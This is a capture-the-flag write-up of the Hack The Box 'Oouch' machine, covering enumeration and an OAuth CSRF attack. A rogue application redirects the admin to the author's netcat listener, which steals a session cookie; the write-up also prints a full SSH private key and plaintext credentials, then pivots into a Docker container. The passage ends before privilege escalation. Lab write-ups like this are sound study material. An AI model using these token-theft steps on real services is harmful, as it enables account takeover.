---
"title": "Hack The Box - Oouch"
"date": 2020-08-01
"tags": ["linux", "hard", "oauth", "csrf", "dbus", "docker"]
"keywords": ["linux", "hard", "oauth", "csrf", "dbus", "docker"]
"categories": ["HackTheBox"]
"author": "Ghostbyt3"
"description": "This box includes tons of enumeration and Initial is by exploiting OAuth by authoring the administrator and create our own application and get admin session ID and grab ssh key of the user. And then we need to exploit uwsgi to get www-data because dbus running as root in www-data. Finally, by exploiting dbus we will get a shell as www-data."
"featured_image": "/img/htb-oouch/Untitled.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "HackTheBox - Writeup"
---


![Untitled](/img/htb-oouch/Untitled.png)

This box includes tons of enumeration and Initial is by exploiting OAuth by authoring the administrator and create our own application and get admin session ID and grab ssh key of the user. And then we need to exploit uwsgi to get www-data because dbus running as root in www-data. Finally, by exploiting dbus we will get a shell as www-data.

Link: [https://www.hackthebox.eu/home/machines/profile/231](https://www.hackthebox.eu/home/machines/profile/231)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results:

```bash
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.6
|      Logged in as ftp
|      TYPE: ASCII
|      Session bandwidth limit in byte/s is 30000
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA)
|_  256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519)
5000/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
| http-title: Welcome to Oouch
|_Requested resource was http://10.10.10.177:5000/login?next=%2F
8000/tcp open  rtsp
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     [h1](h1)Bad Request (400)[/h1](/h1)
|   RTSPRequest: 
|     RTSP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     [h1](h1)Bad Request (400)[/h1](/h1)
|   SIPOptions: 
|     SIP/2.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|_    [h1](h1)Bad Request (400)[/h1](/h1)
|_http-title: Site doesn't have a title (text/html).
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.80%I=7%D=6/7%Time=5EDCB6BB%P=x86_64-pc-linux-gnu%r(Get
SF:Request,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/html\r\nVary:\x20Authorization\r\n\r\n[h1](h1)Bad\x20Request\x20\(400\)</h
SF:1>")%r(FourOhFourRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n[h1](h1)Bad\x20Requ
SF:est\x20\(400\)[/h1](/h1)")%r(HTTPOptions,64,"HTTP/1\.0\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n[h1](h1)
SF:Bad\x20Request\x20\(400\)[/h1](/h1)")%r(RTSPRequest,64,"RTSP/1\.0\x20400\x20
SF:Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\
SF:r\n\r\n[h1](h1)Bad\x20Request\x20\(400\)[/h1](/h1)")%r(SIPOptions,63,"SIP/2\.0\x
SF:20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Autho
SF:rization\r\n\r\n[h1](h1)Bad\x20Request\x20\(400\)[/h1](/h1)");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.5 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## FTP

I did `anonymous` login and it says `qtc's development server` maybe it can be a valid user and found a `project.txt` file there. Downloaded that to my machine.

```bash
root@kali:~# ftp 10.10.10.177 
Connected to 10.10.10.177.
220 qtc's development server
Name (10.10.10.177:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt
226 Directory send OK.
ftp> get project.txt
local: project.txt remote: project.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for project.txt (49 bytes).
226 Transfer complete.
49 bytes received in 0.00 secs (1.1126 MB/s)
```

`project.txt`

```bash
root@kali:~/CTF/HTB/Boxes/Oouch# cat project.txt 
Flask -> Consumer
Django -> Authorization Server
```

## Port 8000

I get a Bad Request, so I decided to move to the next port.

![Untitled](/img/htb-oouch/Untitled%201.png)

## Port 5000 (HTTP)

It shows a login page and there is also the Register tab. Before going through them I decided to check the directories available.

![Untitled](/img/htb-oouch/Untitled%202.png)

## Gobuster Scan Results

```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://oouch.htb:5000/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/07 15:14:19 Starting gobuster
===============================================================
/contact (Status: 302)
/about (Status: 302)
/home (Status: 302)
/login (Status: 200)
/register (Status: 200)
/profile (Status: 302)
/documents (Status: 302)
/logout (Status: 302)
===============================================================
2020/06/07 16:44:07 Finished
===============================================================
```

Everything redirects to `login.php`

So time to create an account and proceed, created an account as `wolf : wolf`

![Untitled](/img/htb-oouch/Untitled%203.png)

Logged in with the credentials which I just created now. Now time for enumeration.

![Untitled](/img/htb-oouch/Untitled%204.png)

I can't find anything useful here. So decided to run Gobuster with another wordlist.

## Gobuster New Scan Results

```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.177:5000
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/08 09:49:48 Starting gobuster
===============================================================
/about (Status: 302)
/contact (Status: 302)
/documents (Status: 302)
/home (Status: 302)
/login (Status: 200)
/logout (Status: 302)
/oauth (Status: 302)
/profile (Status: 302)
/register (Status: 200)
===============================================================
2020/06/08 09:57:39 Finished
===============================================================
```

`/oauth`

![Untitled](/img/htb-oouch/Untitled%205.png)

It reveals a new subdomain `consumer.oouch.htb` so Added it to `/etc/hosts`

When I open [`http://consumer.oouch.htb:5000/oauth/connect`](http://consumer.oouch.htb:5000/oauth/connect), It redirects me to some another subdomain `authorization.oouch.htb:8000` so Added it to my `/etc/hosts`

![Untitled](/img/htb-oouch/Untitled%206.png)

So now it makes sense that `consumer` is running in `Flask` and `Authorization` is running in `Django`(The info we got from project.txt).

## How OAuth works?

`authorization.oouch.htb:8000` So this is the thing running in port 8000

![Untitled](/img/htb-oouch/Untitled%207.png)

Its using an `Oauth2`Protocol.

> **What is OAuth?** OAuth is an open standard for access delegation, commonly used as a way for Internet users to grant websites or applications access to their information on other websites but without giving them the passwords. ... The third party then uses the access token to access the protected resources hosted by the resource server.

So I created an account here too.

![Untitled](/img/htb-oouch/Untitled%208.png)

Logged in so this is the `OAuth` server.

![Untitled](/img/htb-oouch/Untitled%209.png)

Before getting into it, I decided to learn why OAuth is using it here along with Django and found this video.

> [https://www.youtube.com/watch?v=nKmvRQVvNdI](https://www.youtube.com/watch?v=nKmvRQVvNdI)

> [https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/](https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/)

I will explain according to the video, If you saw them

![Untitled](/img/htb-oouch/Untitled%2010.png)

- Alice ⇒ Me
- 3D Printing Service ⇒ ([http://consumer.oouch.htb:5000](http://consumer.oouch.htb:5000/))
- Cloud Storage ⇒ ([http://authorization.oouch.htb:8000](http://authorization.oouch.htb:8000/))

## Exploiting OAuth

So Let's start with `connect`

![Untitled](/img/htb-oouch/Untitled%2011.png)

So First link is to connect our account to Authorization server and second link is to login once our account is connected.

This shows what exactly gonna happen

![Untitled](/img/htb-oouch/Untitled%2012.png)

- Alice ⇒ Me
- 3D Printing Service ⇒ ([http://consumer.oouch.htb:5000](http://consumer.oouch.htb:5000/))
- Cloud Storage ⇒ ([http://authorization.oouch.htb:8000](http://authorization.oouch.htb:8000/))

When I try to get authenticated to the `Consumer` it redirects to `Authorization.oouch.htb`

[`http://consumer.oouch.htb:5000/oauth/connect`](http://consumer.oouch.htb:5000/oauth/connect)

![Untitled](/img/htb-oouch/Untitled%2013.png)

Before clicking `Authorize` make sure to capture the request in Burp.

This is the way how the client asks for authorization.

![Untitled](/img/htb-oouch/Untitled%2014.png)

Once you click Follow the Redirection.

This is what now exactly gonna happen now.

![Untitled](/img/htb-oouch/Untitled%2015.png)

- Alice ⇒ Me
- 3D Printing Service ⇒ ([http://consumer.oouch.htb:5000](http://consumer.oouch.htb:5000/))
- Cloud Storage ⇒ ([http://authorization.oouch.htb:8000](http://authorization.oouch.htb:8000/))

Now we get the callback from the Victim and this the `code` we need and don't do `Follow Redirection` we need to drop the request here because the code is one time use or Just don't do anything just grab the `code`. (NOTE : Make sure you also try in Proxy > Intercept if its not working in Repeater)

![Untitled](/img/htb-oouch/Untitled%2016.png)

Here there is no `state` parameter which shows that its vulnerable. That makes it no link between my account to it.

> state: The state parameter can persist data between the user being directed to the authorization server and back again. It’s important that this is a unique value as it serves as a CSRF protection mechanism if it contains a unique or random value per request

Now I need this link to be open by the System Administrator so that leads their account to be Authorized and log me into them.

```bash
http://oouch.htb:5000/oauth/connect/token?code=4R01kkfnav0LiME65r9R369HWrbs2b
```

There is a contact page and it shows the message we send here are forwarded to the system administrator so that's what I want now. Now Once he clicks this link, he will be authorized. (You need to wait sometime).

![Untitled](/img/htb-oouch/Untitled%2017.png)

Now instead of connect we need to follow this link to login `consumer.oouch.htb:5000/oauth/login`

![Untitled](/img/htb-oouch/Untitled%2018.png)

Click  `Authorize`

And We logged in as `qtc` he must be the system administrator we meant before. (Note: It takes more than 5 times to do this and if you get Server error just reload the page). So What happened now is. He just clicked the link with the `code`  I send and authorized himself and once we try to login the `authorization.oouch.htb`, it will only allow authorized account (qtc) and we logged in.

![Untitled](/img/htb-oouch/Untitled%2019.png)

Now we have some new info in `/documents`

![Untitled](/img/htb-oouch/Untitled%2020.png)

Now we got some creds and we need to find a way to use it.

So I started digging in all directories and found new in `http://authorization.oouch.htb:8000/oauth`

```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://authorization.oouch.htb:8000/oauth
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/08 13:20:12 Starting gobuster
===============================================================
/applications (Status: 301)
===============================================================
2020/06/08 13:22:05 Finished
===============================================================
```

It says `Oouch Admin Only` and I cant login with creds.

![Untitled](/img/htb-oouch/Untitled%2021.png)

Since it's looks like a directory, I decided to bruteforce this directory.

```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://authorization.oouch.htb:8000/oauth/applications
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/08 13:55:55 Starting gobuster
===============================================================
/register (Status: 301)
===============================================================
2020/06/08 13:57:48 Finished
===============================================================
```

Now here we can see its `Oouch Development` and Logged in with `develop : supermegasecureklarabubu123!`

![Untitled](/img/htb-oouch/Untitled%2022.png)

Here we have some options to Register a new application.

![Untitled](/img/htb-oouch/Untitled%2023.png)

So I registered a new application here, to see what's going on.

![Untitled](/img/htb-oouch/Untitled%2024.png)

Back to our home page, we can see there are 2 options one is token and authorize.

![Untitled](/img/htb-oouch/Untitled%2025.png)

If you remember correctly, when we try to login here `consumer.oouch.htb:5000/oauth/login` the parameter looks like this. Now we have our own application . So If the Administrator click this we can grab his session id.

```bash
http://authorization.oouch.htb:8000/oauth/authorize?client_id=4muao51xk7wSAAMFe970Cr80vQaO8DusCEQW81fG&redirect_uri=http://10.10.14.9:1234&grant_type=client_credentials&client_secret=IVehRabE8UzG9EQrzDUCy7gfupOlL15y5RKc10CeWFJT8f9zWjf3CylrUriGwEatsPvjOZyoIfagE1hF4GgKAEV9ETNuZ2N5cUx5kEMWeuTaGVSl89gzPFwoJeEE0vEI
```

I send the link, the same way we did before.

![Untitled](/img/htb-oouch/Untitled%2026.png)

And I got a hit in my netcat and got the Administrator( qtc ) sessionid.

```bash
root@kali:~/CTF/HTB/Boxes/Oouch# nc -lnvp 1234 > something2
listening on [any] 1234 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.177] 38648
root@kali:~/CTF/HTB/Boxes/Oouch# cat something2 
GET /?error=invalid_request&error_description=Missing+response_type+parameter. HTTP/1.1
Host: 10.10.14.9:1234
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Cookie: sessionid=w9q1h1m2fxe7o2gka30kvlicbuddkjic;
```

## Getting User Shell

I edited the cookie and replaced it with the old cookie and reloaded the page.

![Untitled](/img/htb-oouch/Untitled%2027.png)

Now we can see I'm logged in as `qtc`.

We already got the client_id and client_secret so I can get the access_token.

```bash
root@kali:~/CTF/HTB/Boxes/Oouch# curl -X POST 'http://authorization.oouch.htb:8000/oauth/token/' -H "Content-Type: application/x-www-form-urlencoded" --data "grant_type=client_credentials&client_id=4muao51xk7wSAAMFe970Cr80vQaO8DusCEQW81fG&client_secret=IVehRabE8UzG9EQrzDUCy7gfupOlL15y5RKc10CeWFJT8f9zWjf3CylrUriGwEatsPvjOZyoIfagE1hF4GgKAEV9ETNuZ2N5cUx5kEMWeuTaGVSl89gzPFwoJeEE0vEI" -L -s

{"access_token": "vcvGfw7s9nDlRDedGKFgEOsDfw127H", "expires_in": 600, "token_type": "Bearer", "scope": "read write"}
```

Using that token, after some fuzzing I used `get_ssh` to grab the user's ssh key.

![Untitled](/img/htb-oouch/Untitled%2028.png)

Aligned that in correct form.

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

I gave permission to the private key and logged in.

```bash
root@kali:~/CTF/HTB/Boxes/Oouch# chmod 600 id_rsa 
root@kali:~/CTF/HTB/Boxes/Oouch# ssh -i id_rsa qtc@oouch.htb
The authenticity of host 'oouch.htb (10.10.10.177)' can't be established.
ED25519 key fingerprint is SHA256:6/ZyfRrDDz0w1+EniBrf/0LXg5sF4o5jYNEjjU32y8s.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'oouch.htb,10.10.10.177' (ED25519) to the list of known hosts.
Linux oouch 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Feb 25 12:45:55 2020 from 10.10.14.3
qtc@oouch:~$ ls
user.txt
qtc@oouch:~$ cat user.txt
```

## Docker Exploitation

I checked the IP address first and these look suspicious.

```bash
2: ens34: [BROADCAST,MULTICAST,UP,LOWER_UP](BROADCAST,MULTICAST,UP,LOWER_UP) mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:b9:a0:8f brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.177/24 brd 10.10.10.255 scope global ens34
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:a08f/64 scope global dynamic mngtmpaddr 
       valid_lft 86278sec preferred_lft 14278sec
    inet6 fe80::250:56ff:feb9:a08f/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: [NO-CARRIER,BROADCAST,MULTICAST,UP](NO-CARRIER,BROADCAST,MULTICAST,UP) mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:34:15:e2:61 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-cc6c78e0c7d0: [BROADCAST,MULTICAST,UP,LOWER_UP](BROADCAST,MULTICAST,UP,LOWER_UP) mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:fe:21:5c:13 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-cc6c78e0c7d0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:feff:fe21:5c13/64 scope link 
       valid_lft forever preferred_lft forever
```

First one is the Box IP and the other is Docker IP

```bash
[i] net510 Routing table................................................... yes!
---
default via 10.10.10.2 dev ens34 onlink 
10.10.10.0/24 dev ens34 proto kernel scope link src 10.10.10.177 
169.254.0.0/16 dev ens34 scope link metric 1000 
172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1 linkdown 
172.18.0.0/16 dev br-cc6c78e0c7d0 proto kernel scope link src 172.18.0.1 
---
[i] net520 ARP table....................................................... yes!
---
172.18.0.2 dev br-cc6c78e0c7d0 lladdr 02:42:ac:12:00:02 STALE
10.10.10.2 dev ens34 lladdr 00:50:56:b9:6a:d2 REACHABLE
172.18.0.3 dev br-cc6c78e0c7d0 lladdr 02:42:ac:12:00:03 STALE
fe80::250:56ff:feb9:6ad2 dev ens34 lladdr 00:50:56:b9:6a:d2 router STALE
---
```

In the home directory, we have the id_rsa so I tried login with the SSH keys to Docker Interface and It failed, I tried a few more none helped.

```bash
qtc@oouch:~/.ssh$ ssh -i id_rsa qtc@172.17.0.1
qtc@172.17.0.1: Permission denied (publickey).
qtc@oouch:~/.ssh$ ssh -i id_rsa qtc@172.17.0.2
ssh: connect to host 172.17.0.2 port 22: No route to host
```

So decided to move to the next interface.

```bash
qtc@oouch:~/.ssh$ ssh -i id_rsa qtc@172.18.0.1
The authenticity of host '172.18.0.1 (172.18.0.1)' can't be established.
ED25519 key fingerprint is SHA256:6/ZyfRrDDz0w1+EniBrf/0LXg5sF4o5jYNEjjU32y8s.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.18.0.1' (ED25519) to the list of known hosts.
qtc@172.18.0.1: Permission denied (publickey).
qtc@oouch:~/.ssh$ ssh -i id_rsa qtc@172.18.0.2
ssh: connect to host 172.18.0.2 port 22: Connection refused
qtc@oouch:~/.ssh$ ssh -i id_rsa qtc@172.18.0.3
The authenticity of host '172.18.0.3 (172.18.0.3)' can't be established.
ED25519 key fingerprint is SHA256:ROF4hYtv6efFf0CQ80jfB60uyDobA9mVYiXVCiHlhSE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.18.0.3' (ED25519) to the list of known hosts.
Linux aeb4525789d8 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
qtc@aeb4525789d8:~$
```

And Im logged in this IP `172.18.0.3`

Found `code` folder, 

```bash
**qtc@aeb4525789d8:/code$ ls -R
.:
Dockerfile  authorized_keys  config.py  consumer.py  key  migrations  nginx.conf  oouch  requirements.txt  start.sh  urls.txt  uwsgi.ini

./migrations:
README  __pycache__  alembic.ini  env.py  script.py.mako  versions

./migrations/__pycache__:
env.cpython-37.pyc

./migrations/versions:
__pycache__  fae68f5fec41_users_table.py

./migrations/versions/__pycache__:
fae68f5fec41_users_table.cpython-37.pyc

./oouch:
__init__.py  __pycache__  forms.py  models.py  routes.py  static  templates

./oouch/__pycache__:
__init__.cpython-37.pyc  forms.cpython-37.pyc  models.cpython-37.pyc  routes.cpython-37.pyc

./oouch/static:
css  js

./oouch/static/css:
bootstrap-grid.css      bootstrap-grid.min.css      bootstrap-reboot.css      bootstrap-reboot.min.css      bootstrap-theme.min.css  bootstrap.css.map  bootstrap.min.css.map  menu.css
bootstrap-grid.css.map  bootstrap-grid.min.css.map  bootstrap-reboot.css.map  bootstrap-reboot.min.css.map  bootstrap.css            bootstrap.min.css  home.css

./oouch/static/js:
bootstrap.bundle.js  bootstrap.bundle.js.map  bootstrap.bundle.min.js  bootstrap.bundle.min.js.map  bootstrap.js  bootstrap.js.map  bootstrap.min.js  bootstrap.min.js.map

./oouch/templates:
about.html  base.html  contact.html  documents.html  error.html  hacker.html  home.html  login.html  oauth.html  password_change.html  profile.html  qtc_documents.html  register.html
qtc@aeb4525789d8:/code$**
```

This is the webpages running in port `5000` and `8000`

While checking the files, this `[router.py](http://router.py)` seems suspicious

```python
# First apply our primitive xss filter
        if primitive_xss.search(form.textfield.data):
            bus = dbus.SystemBus()
            block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
            block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
```

> **What is D-Bus?** D-Bus is a message bus system, a simple way for applications to talk to one another. In addition to interprocess communication, D-Bus helps coordinate process lifecycle; it makes it simple and reliable to code a "single instance" application or daemon, and to launch applications and daemons on demand when their services are needed.

## Privilege Escalation

`ps aux` will display all the process running in the background and there is something called `uWSGI` running as `www-data` so now it makes sense we need to find a way to get `www-data` and he uses `D-Bus` to send messages to root so we can get a shell from there.

```bash
qtc@aeb4525789d8:/usr/share/dbus-1$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   5488  3200 ?        Ss   Jun08   0:00 /bin/bash ./start.sh
root        14  0.0  0.0  15852  2972 ?        Ss   Jun08   0:00 /usr/sbin/sshd
root        27  0.0  0.0  10476   844 ?        Ss   Jun08   0:00 nginx: master process /usr/sbin/nginx
www-data    28  0.0  0.0  11264  3920 ?        S    Jun08   0:00 nginx: worker process
www-data    29  0.0  0.0  11264  3920 ?        S    Jun08   0:00 nginx: worker process
www-data    30  0.0  1.1  57492 46876 ?        S    Jun08   0:06 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    31  0.0  1.2  70636 48576 ?        S    Jun08   0:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    32  0.0  1.2  70584 48600 ?        S    Jun08   0:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    33  0.0  1.2  70688 48780 ?        S    Jun08   0:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    34  0.0  1.2  70596 48836 ?        S    Jun08   0:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    35  0.0  1.1  70216 48128 ?        S    Jun08   0:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    36  0.0  1.2  70892 48940 ?        S    Jun08   0:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    37  0.0  1.2  70356 48644 ?        S    Jun08   0:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    38  0.0  1.2  70612 48524 ?        S    Jun08   0:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    39  0.0  1.1  70216 48404 ?        S    Jun08   0:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    40  0.0  1.2  70668 48636 ?        S    Jun08   0:00 uwsgi --ini uwsgi.ini --chmod-sock=666
root        41  0.0  0.1  16884  7824 ?        Ss   04:17   0:00 sshd: qtc [priv]
qtc         47  0.0  0.1  16884  4760 ?        S    04:17   0:00 sshd: qtc@pts/0
qtc         48  0.0  0.0   4000  3336 pts/0    Ss   04:17   0:00 -bash
